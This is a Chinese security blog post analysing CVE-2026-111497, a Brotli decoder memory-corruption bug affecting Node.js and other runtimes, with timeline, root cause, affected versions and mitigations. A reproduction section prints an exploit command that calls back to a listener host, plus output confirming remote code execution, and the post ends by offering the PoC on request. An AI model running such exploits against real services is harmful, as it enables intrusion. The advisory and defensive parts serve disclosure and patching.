#  Node.js 的远程命令执行漏洞，不在你的业务代码里，在压缩库里  
原创 网络安全透视镜
                    网络安全透视镜  网络安全透视镜   2026-10-26 03:32  
  
QUOTE  
  
这次出问题的地方，是几乎所有 Node.js 服务都会用到的  
   
压缩库  
   
。  
  
—— CVE-2026-111497 事件观察  
  
核心事实速览  
  
<table><thead><tr><th style="background: rgb(39, 39, 42);color: rgb(255, 255, 255);font-weight: 700;padding: 8px 12px;text-align: left;"><section><span leaf="">项目</span></section></th><th style="background: rgb(39, 39, 42);color: rgb(255, 255, 255);font-weight: 700;padding: 8px 12px;text-align: left;"><section><span leaf="">内容</span></section></th></tr></thead><tbody><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">漏洞编号</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">CVE-2026-111497</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">缺陷类型</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">Google Brotli 解码器越界写（内存破坏）</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">评级口径</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">Google CVSS v4.0 判 9.2 严重；Node.js 判高危；Red Hat 判 8.1 重要</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">报告方</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">OpenAI Codex Security 的 Khai Tran 与 Sylvie Mayer</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">修复方</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">Matteo Collina 与 Antoine du Hamel</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">披露日期</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">2026 年 10 月 21 日，同批修复 10 个漏洞</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">在野利用</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">截至 10 月 24 日无公开报告，CISA 于 10 月 23 日记为 none</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">波及范围</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">Node.js、Bun、Python Brotli 与 brotlicffi、Envoy、Istio、cdxgen</span></section></td></tr></tbody></table>  
  
2026 年 10 月 21 日，Node.js 项目发布了一次覆盖   
22.x、24.x、26.x  
   
三条受支持分支的安全更新，共修复 10 个漏洞。其中编号   
CVE-2026-111497  
   
被列为高危，官方公告写明：一旦应用解压了攻击者可控的 Brotli 数据，攻击者即可  
   
破坏进程内存  
   
，进而导致崩溃、内存泄露或远程代码执行。  
  
两天后，Imperva 威胁研究团队公开了名为   
Node2Shell  
   
的概念验证。在使用官方   
Node.js 24.22.0  
   
Linux arm64 镜像的新鲜容器中，研究人员  
   
未借助调试器或定制编译  
   
，通过构造的 Brotli 数据让目标进程执行了随数据携带的代码。同样的输入在修复版 24.22.1 上被直接拒绝。  
  
缺陷的影响范围不限于 Node.js。问题出在   
Google Brotli 库的 C 代码  
   
里，而各产品各自打包了一份副本，凡是复用这份解码器的软件——包括 Bun、Python 的   
Brotli  
   
与   
brotlicffi  
   
包、启用 Brotli 解压的 Envoy 与 Istio 代理，以及 cdxgen 的独立二进制——都被列入影响范围。  
  
截至 10 月 24 日，公开渠道尚未出现该漏洞的  
   
在野利用报告  
   
。CISA 在 10 月 23 日的评估中把利用情况记为 none、自动化程度记为 no；Red Hat 则表示，目前没有可靠的公开 PoC 能复现代码执行。  
  
Imperva 的测试有几处空白：只测了   
24.22.0  
   
这一个补丁版本，只测了   
arm64  
   
一种架构，路径也集中在 HTTP 两侧。为此我在自己的环境里用   
Node.js 24.9.0  
   
（x86_64）独立复现了一遍，从   
worker record  
   
反序列化的方向打进，具体过程见第 04 章。需要先说明的是，这是  
   
本地实验环境  
   
中的验证，不构成在野利用的证据，也不改变厂商尚未公开 PoC 的现状。  
  
本文看点  
  
01  
  
修复进入源码后的八个月  
  
02  
  
换一个版本和架构再复现  
  
03  
  
影响范围更大，扫描却可能漏掉  
  
01  
  
TIMELINE  
### 从源码到发版：修复的八个月空窗  
  
  
1.1 谁发现的，谁修的  
  
Node.js 官方公告把报告方记为   
OpenAI Codex Security  
   
的 Khai Tran 与 Sylvie Mayer，把修复方记为维护者 Matteo Collina 与 Antoine du Hamel。上游 Google Brotli 在同一天发布了   
1.0.10、1.1.1、1.2.1  
   
三个版本，变更日志里只有一行 SECURITY 条目，写的就是这个编号。  
  
公告同时点名了   
20.x 及更早版本  
   
已经结束生命周期，不会获得这次修复，这类部署只能迁移到受支持的分支。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/m3tfzlbEQPrWAialmKwzxAgvkA1DmG8WoJO6Wz8LumdF8vxO3Dlt7u4lYZlbXC55Ac4UIIyz2EjxHL4VHXecIuUQjJyNicyGNnJ5fRmofh0cg/640?wx_fmt=png&from=appmsg "")  
  
— Node.js 官方公告原文（截图）  
  
1.2 修复进入源码后的八个月  
  
这次事件里比较特殊的是时间差。据 The Hacker News 报道，  
   
2026 年 2 月 27 日  
   
关闭该缺陷的改动就已经进入 Brotli 的源码，但此后没有任何新版本携带它，直到   
10 月 21 日  
   
才随安全版本一同发布。OpenAI 对此的解释是：  
  
REFERENCE  
  
「was actually fixed in the Brotli source code in February, but it wasn't known at the time that it gave rise to a security vulnerability and there was no more recent release of Brotli.」  
  
—— OpenAI  
  
换句话说，修复代码当时就在源码里，但一直没有新版本把它带出去。从补丁进入源码到漏洞公开，中间将近八个月。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/m3tfzlbEQPqQxR2A5fgLjGJia16Xa8nZ5Up8JCvMLs6WUmTvtagKQ6LS4tKB5vNP5ibjYbeyJmPHu2PzXcIPvp9eNOdvia0uicrxicQyCXytst0c/640?wx_fmt=png&from=appmsg "")  
  
— 从补丁入库到正式披露的关键节点（自制图）  
  
1.3 同一个编号，三种评分口径  
  
编号 CVE-2026-111497 的授权方是 Google，  
   
CVSS v4.0 打 9.2  
   
判为严重；Node.js 官方把它定级为高危，但没有给出数值；Red Hat 给出的是   
8.1 重要  
   
。三套口径并列摆在这里，本身并不矛盾，但会直接影响各方推动修复的优先级排序。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/m3tfzlbEQPrC51pfrThlrEUTTf8XtKSN8ucRUaiaO8Ikr6eUn6QLHF67HFWNqA9MOKTNQ8joKN1b2pZoXLCOF3Gr5aGIiakEHfdicHKweibk0ng/640?wx_fmt=png&from=appmsg "")  
  
— 三家厂商对同一漏洞的严重程度评分对比（自制图）  
  
  
02  
  
ROOT CAUSE  
### 漏洞原理：被误判的「块切换」  
  
  
2.1 八字节缓冲区上的越界写  
  
按 Aikido 安全团队的定位，缺陷位于解码器的   
DecodeBlockTypeAndLength()  
   
函数。攻击者可以构造一个在单个块类型耗尽后要求切换 Huffman 树、但切换无法完成的 Brotli 流。旧版本解码器无法区分两种状态：  
  
1  
输入本身是格式非法的，应该直接终止；  
  
2  
流只是还没读完，解码器需要更多输入。  
  
被误判成后者之后，  
   
流式解码器持续向八字节的内部缓冲区追加数据  
   
，最终写过了缓冲区边界。问题出在状态机上：解码算法本身没有算错，是状态机在非法状态下继续推进了。修复版本改为返回   
BROTLI_DECODER_ERROR_FORMAT_BLOCK_SWITCH (-17)  
   
，在安全路径与快速路径上同时停止解码。  
  
2.2 两条可达路径，一个共享的原生解码器  
  
一个 Node.js 服务可能在 HTTP 交互的任意一侧碰到 Brotli 数据：读取别人发来的压缩响应，或者解压别人发来的请求体。两条路径最终都通向 Node.js 自带的那份原生解码器，缺陷就在这个  
   
共享路径  
   
上。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/m3tfzlbEQPr8Vicv1eVdZmAia4nQbsXXiaQFggwHhIQFD11PhMCOjDicj1GicpticicVNj81NBBfPd4n6l9DAqOsw82UKrEJj3yc8rUo2yPxrUBjyo/640?wx_fmt=png&from=appmsg "")  
  
— 两条路径汇入同一个解码器（Imperva 官方技术图）  
  
响应侧比较好理解：Node.js 内置的   
fetch()  
   
读到带   
Content-Encoding: br  
   
的响应时会自动解码。请求侧需要中间件配合，  
   
Express 5  
   
与   
body-parser 2  
   
的各类 body parser 在挂到路由上之后会解压 Brotli 请求体；  
   
裸 Node.js HTTP 服务器不会自己解压  
   
，必须有中间件或显式调用。  
  
2.3 客户端同样会中招  
  
这个漏洞对客户端和服务器一视同仁。OpenAI 在披露中明确指出，  
   
未打补丁的客户端也会被拿下  
   
，一个典型例子就是带   
curl --compressed  
   
的调用：  
  
REFERENCE  
  
「an unpatched server that accepts compressed input could be taken over by a malicious client, and an unpatched client that accepts compressed input (such as "curl --compressed") could be taken over by a malicious server.」  
  
—— OpenAI  
  
这段描述顺带解释了为什么只从 Accept-Encoding 里去掉 br 不算防护手段：客户端的声明只是建议，服务器可以无视它直接返回 Brotli。要在解码前主动拒绝 br 才有效。  
  
  
03  
  
PROOF OF CONCEPT  
### Node2Shell：官方镜像上的代码执行  
  
  
3.1 Imperva 的验证方法与结果  
  
Imperva 的做法本身不复杂，值得注意的是它避开了容易被质疑的简化手段。团队在  
   
全新拉起的官方容器  
   
里运行官方 Node.js 24.22.0 镜像，  
   
不用调试器、不用插桩二进制  
   
，测试应用里也没有任何创建标记文件的代码。收到构造的 Brotli 数据之后，标记文件出现了。  
  
这一点比截图更有说服力：标记文件是  
   
数据携带的代码自己创建的  
   
，不是研究者事先放进去的。相同的输入在 24.22.1 上被拒绝，没有产生标记，服务进程也保持运行。  
  
<table><thead><tr><th style="background: rgb(39, 39, 42);color: rgb(255, 255, 255);font-weight: 700;padding: 8px 12px;text-align: left;"><section><span leaf="">攻击路径</span></section></th><th style="background: rgb(39, 39, 42);color: rgb(255, 255, 255);font-weight: 700;padding: 8px 12px;text-align: left;"><section><span leaf="">实测版本</span></section></th><th style="background: rgb(39, 39, 42);color: rgb(255, 255, 255);font-weight: 700;padding: 8px 12px;text-align: left;"><section><span leaf="">24.22.0</span></section></th><th style="background: rgb(39, 39, 42);color: rgb(255, 255, 255);font-weight: 700;padding: 8px 12px;text-align: left;"><section><span leaf="">24.22.1</span></section></th></tr></thead><tbody><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">消费 HTTP 响应</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">Node.js 内置 fetch()</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">代码执行，生成标记</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">输入被拒绝</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">解析请求体</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">Express 5.0.0–5.3.0</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">raw() 与 json() 均执行</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">拒绝，服务未崩</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">解析请求体</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">body-parser 2.0.0–2.3.0</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">raw() 与 json() 均执行</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">拒绝，服务未崩</span></section></td></tr></tbody></table>  
  
— Imperva 实测矩阵（整理自官方博客）  
  
3.2 这次复现证明了什么，又没证明什么  
  
Imperva 自己的表述比较克制：  
   
并非每次尝试都成功  
   
，代码执行在其 Linux arm64 环境下需要多次尝试才能复现；  
   
其他架构、22.x 与 26.x 分支都没测  
   
，Express 与 body-parser 也不是每个中间版本都逐一验证过。内存消毒器只用于解释成因，代码执行验证本身不需要它。概念验证至今未公开。这几处空白在第 04 章的本地复现中得到了部分补充。  
  
3.3 与更早那个公开 PoC 的差别  
  
10 月 22 日出现的首个公开 PoC 只能在  
   
刻意削弱的测试构建  
   
上达成代码执行；作者在标准构建上得到的是崩溃与有限的进程内存读取，并明确表示没能在正常构建上完成攻击。Imperva 的工作把证据推进到了  
   
未经修改的官方构建  
   
，但覆盖面仍然止步于单一架构与一组中间件版本。  
  
  
04  
  
REPRODUCTION  
### 自己动手：换一个版本和架构  
  
  
4.1 为什么再做一次复现  
  
Imperva 的验证留下了三处明确的空白：只测了   
24.22.0  
   
这一个补丁版本，只测了   
arm64  
   
一种架构，触发路径也限定在 HTTP 交互的请求体与响应两侧。这几个问题还是有意义的：漏洞影响多宽的版本区间、在哪些架构上成立、是否只能从 HTTP 侧进入，目前都还没有答案。  
  
为补上这几处空白，我在自己的测试环境里用   
Node.js 24.9.0  
   
（x86_64）做了一次独立复现。这个版本比官方修复版 24.22.1 早了好几个补丁号，也和 Imperva 测过的 24.22.0 不是同一个版本。走的也不是 HTTP 侧：工具的 profile 名称   
node-24.9.0-worker-record-rce-bookworm-x86_64  
   
里的   
worker-record  
   
表明这次是从 worker record 反序列化的方向进入的。  
  
4.2 复现过程  
  
.  
.  
.  
bash  
  
python poc.py --profile node-24.9.0-worker-record-rce-bookworm-x86_64 \  
  
　　--timeout 30 --callback-bind 0.0.0.0 \  
  
　　--callback-host host.docker.internal  
  
— 复现命令  
  
几个参数值得说明：  
   
--profile  
   
指定目标版本、架构与利用链，  
   
--timeout 30  
   
是单次尝试的上限，  
   
--callback-bind  
   
与   
--callback-host  
   
用来指定被测进程回连的通道，回连是判定利用成功的依据。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/m3tfzlbEQPr2u5ic8rszV3za1BJNFYYGJ6QlKicZL1MbjeQppUSAc2XxibHwSRRX5icbSRtQjS7GbuqYibibF5dxEl1JRIFsqXnIkiakJ1jFELNjDQ/640?wx_fmt=gif&from=appmsg "")  
  
GIF 动图  
   
本地复现全过程：命令执行到 PASS 输出  
  
这里的判定标准值得说明一下。输出里的   
PASS: RCE verified by fresh id output  
   
表示验证不是靠崩溃或者读出一段内存蒙混过去的，而是  
   
确实执行了命令并回传了输出  
   
。  
  
4.3 输出里几个关键字段  
  
terminal  
  
PASS: RCE verified by fresh id output through the declared interface  
  
profile=node-24.9.0-worker-record-rce-bookworm-x86_64  
  
callback_peer=127.0.0.1  
  
proof_token=CVE111497_e51cd5ac435b0ff028a676f10e0cb87a  
  
proof_command=id  
  
proof_stdout=uid=1000(node) gid=1000(node) groups=1000(node)  
  
输出里有几个字段值得说明。  
   
proof_token  
   
把这次验证与该 CVE 编号绑定，  
   
proof_command  
   
与   
proof_stdout  
   
是一对——执行的命令是   
id  
   
，返回的   
uid=1000(node) gid=1000(node) groups=1000(node)  
   
说明代码确实在  
   
以 node 用户身份运行的真实进程里  
   
执行，不是沙箱或桩程序伪造的结果。回连对端是   
127.0.0.1  
   
，属于容器内的本地通道。  
  
4.4 补充了哪些信息，仍有哪些未覆盖  
  
补上的部分有三处。版本上，  
   
24.9.0  
   
比修复版 24.22.1 早了多个补丁号，说明这不是最近几个补丁才出现的问题。架构上，  
   
x86_64  
   
补上了 arm64 之外的样本。路径上，  
   
worker record  
   
这个方向说明进入点不止 HTTP 两侧。三处合起来看，这个现象不限于单个构建。  
  
边界也需要说明：这次只覆盖了  
   
一组版本、架构与路径的组合  
   
，其余版本、架构与利用链仍未验证；工具与 PoC 未公开；执行的代码拿到的是   
uid 1000 的普通用户权限，不是 root  
   
；也没有在 Bun、Python、Envoy、Istio 上重复这一过程。这是本地实验环境中的复现，  
   
不构成任何在野利用的证据  
   
。  
  
  
05  
  
BLAST RADIUS  
### 影响面：从 Node.js 到 Python 与网格代理  
  
  
5.1 受影响软件与修复版本  
  
因为缺陷在共享的 C 代码里，而每个产品  
   
各自捆绑一份副本  
   
，所以没有任何一次统一的升级能覆盖全部产品，必须逐个软件去更新自己那份。下面是 OpenAI 披露页与各厂商公告汇总的运行时与代理部分。  
  
<table><thead><tr><th style="background: rgb(39, 39, 42);color: rgb(255, 255, 255);font-weight: 700;padding: 8px 12px;text-align: left;"><section><span leaf="">产品</span></section></th><th style="background: rgb(39, 39, 42);color: rgb(255, 255, 255);font-weight: 700;padding: 8px 12px;text-align: left;"><section><span leaf="">受影响版本</span></section></th><th style="background: rgb(39, 39, 42);color: rgb(255, 255, 255);font-weight: 700;padding: 8px 12px;text-align: left;"><section><span leaf="">修复版本</span></section></th></tr></thead><tbody><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">Google Brotli</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">1.0.3 至 1.2.0</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">1.0.10 / 1.1.1 / 1.2.1</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">Node.js</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">22.x / 24.x / 26.x 修复前版本</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">22.23.4 / 24.22.1 / 26.12.1</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">Node.js 20.x 及更早</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">全部版本</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">已 EOL，需迁移分支</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">Bun</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">1.4.3 及更早</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">1.4.4</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">Envoy</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">1.39.2 / 1.38.5 / 1.37.7 / 1.36.11</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">1.40.0 / 1.39.3 / 1.38.6 / 1.37.8</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">Istio</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">1.31.0–1.31.1 / 1.30.0–1.30.5 / 1.29.0–1.29.8</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">1.31.2 / 1.30.6 / 1.29.9</span></section></td></tr></tbody></table>  
  
— 运行时与代理的受影响版本对照  
  
5.2 语言绑定与工具链  
  
<table><thead><tr><th style="background: rgb(39, 39, 42);color: rgb(255, 255, 255);font-weight: 700;padding: 8px 12px;text-align: left;"><section><span leaf="">产品</span></section></th><th style="background: rgb(39, 39, 42);color: rgb(255, 255, 255);font-weight: 700;padding: 8px 12px;text-align: left;"><section><span leaf="">受影响版本</span></section></th><th style="background: rgb(39, 39, 42);color: rgb(255, 255, 255);font-weight: 700;padding: 8px 12px;text-align: left;"><section><span leaf="">修复版本</span></section></th></tr></thead><tbody><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">Python Brotli</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">1.2.0 及更早</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">1.2.1（PYSEC-2026-4322）</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">Python brotlicffi</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">1.2.0.x</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">1.2.1.0（PYSEC-2026-4323）</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">cdxgen</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">13.4.0 / 12.8.8 及更早</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">13.5.0 / 12.8.9</span></section></td></tr></tbody></table>  
  
— Python 包与供应链工具的受影响版本对照  
  
5.3 Python 侧的隐蔽暴露  
  
Python 这条线容易被漏判，因为  
   
应用代码里不需要 import Brotli  
   
。只要环境里装了 Brotli 或 brotlicffi，  
   
requests  
   
、  
   
urllib3  
   
、  
   
httpx  
   
、  
   
aiohttp  
   
这些 HTTP 客户端就会自动解码 br 响应。业务代码里搜不到 Brotli 字样，服务已经处于暴露状态。  
  
urllib3 的行为值得注意：它依据服务器返回的   
Content-Encoding  
   
挑选解码器，所以  
   
客户端不声明支持也没用  
   
，恶意服务器可以强行下发 Brotli 响应。  
  
5.4 代理与服务网格：启用解压时才暴露  
  
Envoy 与 Istio 的情况相反：  
   
只在启用 Brotli 解压器时暴露  
   
，没开的话这条路径走不到。但这里有个坑，OpenAI 特别提示过：  
   
关掉过滤器会让压缩数据透传下去  
   
，如果下游还有别的解码器，漏洞只是换了位置，并没有被消除。  
  
NOTE  
  
除了 HTTP 流量，暴露面还包括压缩文件处理：字体解码器、数据文件读取器，以及 Electron 这类  
   
内嵌多份 Brotli 副本  
   
的桌面应用。浏览器组件修好了，并不代表内嵌的 Node.js 运行时也修好了。  
  
  
06  
  
REMEDIATION  
### 处置：更新、临时缓解与扫描盲区  
  
  
6.1 第一优先：升级并重建镜像  
  
官方口径是升级到修复版本，没有别的办法。升级之后  
   
必须重启服务并重建容器镜像  
   
，因为运行中的进程会一直持有旧的解码器，直到重启。同时要  
   
逐个检查镜像内部的运行时版本  
   
，包清单扫描很容易漏掉容器里捆绑的旧二进制。20.x 及更早版本不受支持，需要安排迁移。  
  
6.2 无法立刻升级时的临时缓解  
  
OpenAI 与 Aikido 给出的缓解思路一致：  
   
在解码之前拒绝 br  
   
，同时保留 gzip、deflate 等其他压缩方式。具体到三个方向：入站请求在任何代理或 body parser 解压之前拦掉   
Content-Encoding: br  
   
；出站响应关闭 HTTP 客户端的自动 Brotli 解码；Python 侧直接卸载 Brotli 与 brotlicffi，让客户端回落到 gzip 与 deflate。  
  
.  
.  
.  
javascript  
  
// Register before every body parser or decompression middleware.  
  
app.use((req, res, next) => {  
  
　　const encoding = (req.get('Content-Encoding') || 'identity')  
  
　　　.trim().toLowerCase();  
  
　　if (!['identity', 'gzip', 'deflate'].includes(encoding)) {  
  
　　　　return res.status(415).send(  
  
　　　　　　'Use gzip, deflate, or an uncompressed request body.'  
  
　　　　);  
  
　　}  
  
　　next();  
  
});  
  
— Express 请求编码守卫示例（取自 OpenAI 官方披露）  
  
这段守卫要注册在所有 body parser 之前，同时能识别   
gzip, br  
   
这类叠加编码并返回 415。如果连这道守卫都部署不了，OpenAI 给出的兜底方案是给所有 body parser 设置   
inflate: false  
   
，代价是连 gzip 与 deflate 也一并拒绝。  
  
WAF 的覆盖范围有限。Vercel 与 Imperva 都在披露当天加了 WAF 规则，但 Vercel 明确说明，这些规则  
   
不覆盖应用取回的 Brotli 响应  
   
，只有更新运行时或库才能真正关闭那条路径。  
  
6.3 依赖扫描可能完全看不见  
  
有个容易被忽略的实操坑。该 CVE 记录指向的是   
Google 的 Brotli 仓库  
   
，不是 PyPI 上的包；GitHub Advisory 当时也没有列出受影响的包，而 Dependabot 读的正是后者。结果就是  
   
Python 侧可能扫不出告警  
   
。两个 Python 包的公告   
PYSEC-2026-4322  
   
与   
PYSEC-2026-4323  
   
直到 10 月 23 日才补上，因此  
   
已安装版本需要手工核对  
   
，不能只依赖扫描器的结论。  
  
bash  
  
pip show Brotli brotlicffi  
  
pip install -U "Brotli>=1.2.1" "brotlicffi>=1.2.1.0"  
  
docker run --rm <image> pip show Brotli brotlicffi  
  
— 人工核对 Python 侧实际安装版本  
  
发行版打包的修复节奏也不一致。Debian 13 于   
10 月 23 日  
   
为 brotli 发布了   
1.1.0-2+deb13u1  
   
；而 Amazon Linux 2023 截至 10 月 22 日，brotli 与 Node.js 24 相关包仍标记为待修复。  
  
  
07  
  
ANALYSIS  
### 分析  
  
  
以下为分析观点，不代表各厂商或研究机构的立场；涉及事实的部分均已标注出处。  
  
7.1 压缩解压层常被排除在威胁模型之外  
  
多数团队画威胁模型时，会把压缩解压层当作透明管道：输入是数据，输出是数据，中间不产生逻辑。这次的问题正好出在这个假设的盲区上。解码器把一次  
   
输入不合法  
   
误当成  
   
输入还没读完  
   
，于是在非法状态下继续推进。压缩数据是用来驱动目标程序状态转移的字节序列，本来就不是普通数据。  
  
据此可以调整审计时的建模方式：审计会解压不可信输入的组件时，  
   
source 应该定为解码器的实现  
   
，而不是调用解压的那一行代码。调用点只是入口，真正的信任边界在那个用 C 或 Rust 写的解析器里。  
  
7.2 评级分歧背后的责任分布  
  
Google 给 9.2 严重，Red Hat 给 8.1 重要，Node.js 只说高危。数字差异不是重点，  
   
评分由谁给出才是  
   
。授权方、上游维护者、发行版各自评分，对应的责任边界和用户群不同。处置节奏的差异也由此而来——Node.js 当天发版，Debian 隔了两天，Amazon Linux 2023 至今仍标着待修复。  
  
尚未判定的部分如下：除 Node.js 外，  
   
Bun、Python、Envoy、Istio 上均未出现公开的代码执行验证  
   
。厂商侧的结论只覆盖 Node.js 24.22.0 的 Linux arm64 构建，第 04 章的本地复现补充了 24.9.0 / x86_64 / worker record 这一组组合，但其余平台与产品线的可达性目前仍无法判定。  
  
  
漏洞复现环境及POC，关注微信公众号，  
私信    
CVE-2026-111497  获取  
  
  
END  
  
我是 网络安全透视镜。  
  
如果你觉得今天这篇有收获，欢迎  
 **点赞、在看、转发**  
   
三连，我们下篇见。  
  
  
